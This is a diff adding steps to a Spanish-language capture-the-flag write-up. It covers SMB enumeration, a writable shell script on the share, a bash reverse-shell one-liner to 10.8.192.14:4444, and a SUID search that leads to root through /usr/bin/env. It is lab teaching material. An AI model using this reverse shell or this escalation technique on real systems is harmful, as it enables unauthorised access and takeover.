@@ -84,11 +84,51 @@ smbclient -L ip
 
 Dentro del mismo directorio encontramos dos imagenes
 
+![image](https://github.com/user-attachments/assets/21e73036-f4a4-41a3-9736-9ebbd8cb803c)
+
 - corgo2.jpg
 - puppos.jpeg
 
 Vamos a ver que podemos hacer
 
+Probando diferentes formas ya que estas dos imagenes si que ocultan algo en su interior, pero necesitamos las passwords. 
 
+Nos hemos saltado que en el samba el .sh tiene permisos de todo, con lo cual le podemos probar a meter una rev shell
+
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.8.192.14/4444 0>&1
+```
+
+![image](https://github.com/user-attachments/assets/452d2ede-61d5-4fbc-be37-91c0a786bce6)
+
+Una vez dentro enumeraremos el directorios y explotaremos para hacernos root
+
+Sacamos la primera flag de user.txt
 
 # Explotación
+
+El famoso comando para ver a que tiene permisos el root
+
+```
+find / -user root -perm -u=s 2>/dev/null
+```
+
+/usr/bin/passwd
+/usr/bin/env ← — here
+/usr/bin/gpasswd
+/usr/bin/newuidmap
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/pkexec
+
+Después de ir probando encontramos que el /usr/bin/env tiene una forma de escalar privilegios gracias a gtfobins, parece ser que las dos imagenes no tenian que ver con sacar las flags, luego podemos mirar para sacarlas
+
+![image](https://github.com/user-attachments/assets/40170a51-df77-4e12-842b-6a651482ef37)
+
+GG!!!!!!!!!!!!!!
